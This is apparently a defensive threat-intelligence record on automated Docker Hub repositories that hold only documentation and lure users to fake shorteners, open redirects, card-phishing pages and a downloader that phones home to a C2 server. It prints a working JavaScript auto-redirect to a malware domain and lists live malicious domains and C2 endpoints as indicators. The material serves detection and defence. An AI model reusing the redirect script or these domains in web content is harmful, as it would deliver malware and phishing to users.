package_info.package_name: Imageless Malicious Docker Hub Repositories (Downloader, eBook Phishing, Website SEO Campaigns)
package_info.package_versions: N/A (affects millions of repositories, not versioned)
package_info.why_malicious: These repositories abuse Docker Hub's documentation/metadata feature to deliver malicious links, phishing, and malware payloads. They do not contain legitimate Docker images and are created at massive scale by automated accounts to lure users into malware downloads or credential theft.

malicious_snippets.code_behavior: When a user views the repository and clicks the link, the browser is redirected via a fake URL shortener to a dynamic malware-serving page, resulting in the download of a malicious executable.

malice_analysis.why_suspicious: Repository documentation should not contain obfuscated or shortened links to external, non-official domains, especially those that serve dynamic content.
malice_analysis.violated_expectations: Normal Docker Hub documentation provides usage instructions, not links to external downloaders or malware.
malice_analysis.similar_legitimate_use: Legitimate documentation may link to official project sites or documentation, but not to unknown shorteners or dynamic redirectors.
key_indicators: Use of fake URL shorteners mimicking bitly/tinyurl

malicious_snippets.code_behavior: When a user clicks the link, a Google open redirect is abused to forward the user to a malicious file hosting site, bypassing Google's redirect warning, and resulting in malware download.

malice_analysis.why_suspicious: Abuse of Google open redirect with undocumented parameters to bypass user warnings and deliver malware is a known phishing/malware tactic.
malice_analysis.violated_expectations: Legitimate documentation does not use open redirect exploits to hide the true destination.
malice_analysis.similar_legitimate_use: Rarely, open redirects may be used for tracking, but not for malware delivery.
key_indicators: Use of Google open redirect with usg parameter
Final destination is a malware-serving domain

malicious_snippets.code_behavior: When a user clicks the link, they are redirected to a phishing website that mimics an eBook download page, which then prompts for credit card details under the guise of a free download.

malice_analysis.why_suspicious: Repository documentation should not direct users to external sites that request sensitive information such as credit card details.
malice_analysis.violated_expectations: Legitimate repositories do not require payment or sensitive information for documentation access.
malice_analysis.similar_legitimate_use: None; phishing for credit card data is always illegitimate.
key_indicators: Links to blogspot or similar disposable domains

malicious_snippets.code_snippet:
<script type='text/javascript'>
  var c = new URL(window.location).searchParams.get('el');
  if(c!=null){
    setTimeout('write()', 500);
    setTimeout('Redirect()', 0);
  }else{
   window.setTimeout(function(){
     document.getElementById('redir').href='https://gohhs.com/';
   }, 500);
  }
  function write()
  {
   document.getElementById('redir').href='https://gohhs.com/'+c;
 }
 function Redirect()
 {
   window.location.replace('https://gohhs.com/'+c);
 }
</script>
malicious_snippets.code_behavior: When the page is loaded, the script automatically redirects the user to a malware-serving domain after a short delay, facilitating drive-by malware delivery.

malice_analysis.why_suspicious: Repository documentation should not contain JavaScript that performs automatic redirection to external domains.
malice_analysis.violated_expectations: Legitimate documentation is static and does not execute client-side redirection scripts.
malice_analysis.similar_legitimate_use: Legitimate redirects may occur on official project sites, but not in Docker Hub documentation.

malicious_snippets.code_snippet: freehtmlvalidator.exe (Embarcadero RAD Studio 27.0 binary, C2: http://soneservice[.]shop/new/net_api)
malicious_snippets.code_behavior: Upon execution, the binary collects system information (OS, hardware, browser, .NET version, running processes, network adapters), sends it to a C2 server via XOR+hex-encoded HTTP POST, receives further instructions and payload URLs, and installs additional binaries with persistence via Windows scheduled tasks.

malice_analysis.why_suspicious: The binary performs extensive system reconnaissance, communicates with a C2 server, and installs additional payloads with persistence, all of which are hallmarks of malware.
malice_analysis.violated_expectations: A legitimate installer would not exfiltrate system data or install unrelated binaries with persistence.
malice_analysis.similar_legitimate_use: Some legitimate updaters may check system info, but not with obfuscated C2 comms and unrelated payloads.

attack_chain.action: User discovers and views a malicious Docker Hub repository with enticing documentation (e.g., pirated software, eBooks).
attack_chain.leads_to: User clicks a malicious link in the documentation.

attack_chain.action: User is redirected via fake shortener, open redirect, or JavaScript to a malware-serving or phishing site.
attack_chain.leads_to: User is prompted to download a malicious file or enter sensitive information.

attack_chain.action: User downloads and executes a malicious payload (EXE) or enters credit card details on a phishing site.
attack_chain.leads_to: Malware is installed with persistence, or credentials are stolen.

attack_chain.action: Malware establishes C2 communication, exfiltrates system info, and downloads further payloads.
attack_chain.leads_to: System compromise, further malware installation, or monetization via adware.

behavioral_signatures: Docker Hub repository documentation containing shortened or obfuscated external links
Automatic JavaScript redirection in repository documentation
EXE payloads that perform system reconnaissance and C2 communication
Persistence via Windows scheduled tasks created by unknown binaries
file_indicators: Imageless Docker Hub repositories with only documentation and no image tags
Repository descriptions containing links to known fake shortener domains
Downloaded files named like freehtmlvalidator.exe, Instalar-crack-presto-*.zip
network_indicators: Connections to fake shortener domains (blltly.com, tinourl.com, etc.)
Connections to malware C2 domains (soneservice.shop, failhostingpolp.ru, gts794.com, etc.)
HTTP POSTs with XOR+hex-encoded JSON payloads
detection_knowledge.how_to_detect: Scan Docker Hub repositories for documentation containing external links to known malicious or fake shortener domains, JavaScript redirection, or phishing forms. Monitor for downloads of EXE files from these domains and subsequent C2 traffic. Flag imageless repositories with suspicious metadata for review. Detect persistence mechanisms (e.g., scheduled tasks) created by unknown binaries, and monitor for system reconnaissance activity and encoded outbound HTTP POSTs.
